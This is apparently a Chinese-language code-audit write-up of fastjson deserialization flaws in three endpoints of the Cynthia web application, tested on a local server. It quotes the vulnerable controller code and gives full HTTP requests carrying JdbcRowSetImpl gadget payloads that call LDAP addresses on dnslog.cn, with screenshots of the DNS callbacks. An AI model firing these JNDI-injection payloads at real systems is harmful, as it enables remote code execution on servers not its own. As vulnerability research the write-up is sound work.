## 第一处

漏洞url：[http://192.168.100.4:8080/cynthia_war/template/saveTemplateMailConfig.do](http://192.168.100.4:8080/cynthia_war/template/saveTemplateMailConfig.do)

全局搜索危险函数.parseObject(

找到一处TemplateController.java，深入分析一下代码逻辑

![image](https://github.com/user-attachments/assets/c73a7a3f-ffc6-42bb-832d-9a95aa5ca3f6)


这是路由

```SQL
@RequestMapping("/template")
    @RequestMapping("/saveTemplateMailConfig.do")
```


这是存在漏洞代码：

```SQL
@ResponseBody
	@RequestMapping("/saveTemplateMailConfig.do")
	public String saveTemplateMailConfig(HttpServletRequest request , HttpSession httpSession) throws Exception {
		String templateIdStr = request.getParameter("templateId");
		if (templateIdStr == null || templateIdStr.equals("")) {
			return "";
		}
		
		Template template = das.queryTemplate(DataAccessFactory.getInstance().createUUID(templateIdStr));
		if (template == null) {
			return "";
		}
		
		TemplateMailOption tmo = template.getTemplateMailOption();
		
		JSONObject templateMailOptions = JSONObject.parseObject(request.getParameter("templateMailOptions"));
		
		tmo.setSendMail(templateMailOptions.getString("sendMail").toString().equals("true"));
		tmo.setMailSubject(templateMailOptions.get("mailSubject").toString());
		tmo.getActionUsers().clear();
		
		JSONObject actionUsers = templateMailOptions.getJSONObject("actionUsers");
		for (String actionId : actionUsers.keySet()) {
			tmo.setActionUser(actionId, actionUsers.getString(actionId));
		}

		ErrorCode errorCode = das.updateTemplate(template);
		if(errorCode.equals(ErrorCode.success)){
			das.updateCache(DataAccessAction.update, template.getId().getValue(),template);
			return "true";
		}else{
			return "false";
		}
	}
```


可以看到这块有两处校验：

其一：验证templateId字段是否存在；

其二：将字符串templateId转化为UUID对象，根据UUID去数据库或缓存中查询验证是否存在对应的templateId。

所有要想执行下面的templateMailOptions的.parseObject()方法，就必须先绕过上面两层校验。

![image](https://github.com/user-attachments/assets/56fbaf30-415c-4fa2-88fd-4224db9be74d)


在网站中找到对应位置，查看历史数据包找到存在的templateId的值

![image](https://github.com/user-attachments/assets/46c97fdb-2647-427a-b48f-8a852c2ccbab)


![image](https://github.com/user-attachments/assets/7829bc77-c511-4d2f-a580-4e9669c129de)


```SQL
templateId=744728&templateMailOptions=%7B%22actionUsers%22%3A%7B%7D%2C%22sendMail%22%3Atrue%2C%22mailSubject%22%3A%22%5BCynthia%5D%5B1%5D%E6%95%B0%E6%8D%AE%E6%8C%87%E6%B4%BE%E9%82%AE%E4%BB%B6%22%7D

格式化：
templateId = 744728
&
templateMailOptions = {
  "actionUsers": {},
  "sendMail": true,
  "mailSubject": "[Cynthia][1]数据指派邮件"
}
```


进行构造数据包

```SQL
POST /cynthia_war/template/saveTemplateMailConfig.do HTTP/1.1
Host: 192.168.100.4:8080
X-XSRF-TOKEN: null
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://192.168.100.4:8080
Referer: http://192.168.100.4:8080/cynthia_war/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=8CD4022EE3A992316AC39A25C7683B32; webRootDir="http://192.168.100.4:8080/cynthia_war/"; login_username=admin; login_password=21232f297a57a5a743894a0e4a801fc3; userId=""; login_nickname=admin
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 167

templateId=744728&templateMailOptions=[{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://vrm2rw.dnslog.cn/Exploit",
  "autoCommit": true
}]
```


成功通过校验

![image](https://github.com/user-attachments/assets/20455636-18e4-4f7a-aa49-be6a33408403)


接收到dns请求

![image](https://github.com/user-attachments/assets/77639d50-2dab-4ba4-b5c0-b106d24532d4)


有个疑问：

这块看代码应该传递的是json格式字符串，但是传进去接收不到dns请求，转递json格式数组字符串才能接收到请求，可能在前端传递或者后端处理，或者框架自己进行了处理，不太懂。

## 第二处：

漏洞url：[http://192.168.100.4:8080/cynthia_war/template/saveTemplateMailConfig.do](http://192.168.100.4:8080/cynthia_war/template/saveTemplateMailConfig.do)

漏洞存在代码名称：WebServiceController.java

这是路由：

```SQL
@RequestMapping("/webservice")
	@RequestMapping("/importData.do")
```


这是存在漏洞代码：

```SQL
	@ResponseBody
	@RequestMapping("/importData.do")
	public String importData(HttpServletRequest request , HttpServletResponse response, HttpSession httpSession) throws Exception {
		List<Map<String, String>> allImportDataList = new ArrayList<Map<String,String>>();
		String jsonData = request.getParameter("importDatas");
		JSONArray jsonArray = JSONArray.parseArray(jsonData);
		for (Object object : jsonArray) {
			JSONObject jsonObject = JSONObject.parseObject(object.toString());
			Map<String, String> singleDataMap = new HashMap<String, String>();
			allImportDataList.add(singleDataMap);
			for (String key : jsonObject.keySet()) {
				singleDataMap.put(key, jsonObject.getString(key));
			}
		}
 ....
 ....
 ......
 
```


接收到**`importData`**值（JSON 数组字符串），解析为 `JSONArray` 对象，进行遍历，遍历数组对象就会将数组里面的内容传入`JSONObject.parseObject()`。

![image](https://github.com/user-attachments/assets/30c88f2b-e161-49be-b733-0b1b64f3d43f)


构造数据包：

```SQL
POST /cynthia_war/webservice/importData.do HTTP/1.1
Host: 192.168.100.4:8080
X-XSRF-TOKEN: null
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://192.168.100.4:8080
Referer: http://192.168.100.4:8080/cynthia_war/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=8CD4022EE3A992316AC39A25C7683B32; webRootDir="http://192.168.100.4:8080/cynthia_war/"; login_username=admin; login_password=21232f297a57a5a743894a0e4a801fc3; userId=""; login_nickname=admin
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 141

importDatas=[{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://8fglac.dnslog.cn/Exploit",
  "autoCommit": true
}]
```


![image](https://github.com/user-attachments/assets/4a6ea28e-6771-4a3e-b8e8-8923788d247d)


接收到dns请求

![image](https://github.com/user-attachments/assets/25439ed9-a3c0-4797-ace0-839280e9c5bf)


## 第三处：

漏洞url：[http://192.168.100.4:8080/cynthia_war/user/login.do](http://192.168.100.4:8080/cynthia_war/user/login.do)

登录接口存在fastjson反序列化漏洞

![image](https://github.com/user-attachments/assets/cfac4b2c-49b4-4a33-b0b2-fa9a347cb2c6)


漏洞存在代码文件：UserController.java

漏洞存在代码：

```SQL
	@RequestMapping("/login.do")
	@ResponseBody
	public String login(HttpServletRequest request, HttpServletResponse response ,HttpSession session) throws Exception {
		String userName = request.getParameter("userName");
		String password = request.getParameter("password");
		String remember = request.getParameter("remember");
		String targetUrl = request.getParameter("targetUrl");
		String userId = null;
		
		if (ConfigManager.getEnableSso()) {
			String passport = request.getParameter("passport");
			com.alibaba.fastjson.JSONObject data = com.alibaba.fastjson.JSONObject.parseObject(passport);
			userName = data.getString("username");
			userId = data.getString("id");
		}
     ....
     ....
     ....
     
```


在/login.do路由这块使用了.parseObject()方法，将参数passport的值转化为json对象，但是想进入这个if条件，必须开启sso单点登录，即是if条件值为true

![image](https://github.com/user-attachments/assets/3869372b-c64e-41d9-b6cf-b67ce3f21e8f)


跟踪ConfigManager.getEnableSso()，可以看到properties.getProperty("sso.enable")，继续跟踪这个

![image](https://github.com/user-attachments/assets/e95b67a3-57a9-4f26-99fe-d6b5c7800059)


跳到了配置文件中，可以看到`sso.enable:false`硬编码为false，那就进不去上述那个if条件，无法进行fastjson反序列化测试。

![image](https://github.com/user-attachments/assets/7ad83b02-eac9-4a90-b9cb-978b8c248edb)


进行尝试：

![image](https://github.com/user-attachments/assets/306de25c-faa4-45c2-b6ba-f3f8ef6728d1)


接收不到请求

![image](https://github.com/user-attachments/assets/fe4b38eb-7d11-4e8d-ba52-1a6a66e25307)


为了测试是否存在此漏洞，我将`sso.enable:false`改为`true`，重启tomact服务器。

![image](https://github.com/user-attachments/assets/9b3a0926-c3ba-4f93-b430-ef1214c3bc92)


构造数据包：

```SQL
POST /cynthia_war/user/login.do HTTP/1.1
Host: 192.168.100.4:8080
X-XSRF-TOKEN: null
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://192.168.100.4:8080
Referer: http://192.168.100.4:8080/cynthia_war/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=8CD4022EE3A992316AC39A25C7683B32; webRootDir="http://192.168.100.4:8080/cynthia_war/"; login_username=admin; login_password=21232f297a57a5a743894a0e4a801fc3; userId=""; login_nickname=admin
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 138

passport=[{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://ibs41m.dnslog.cn/Exploit",
  "autoCommit": true
}]
```




![image](https://github.com/user-attachments/assets/223dde74-fc1c-4eff-9456-0fec539f19af)

接收到请求

![image](https://github.com/user-attachments/assets/c735f348-a2d0-49fc-be54-0cda14e5e4c9)


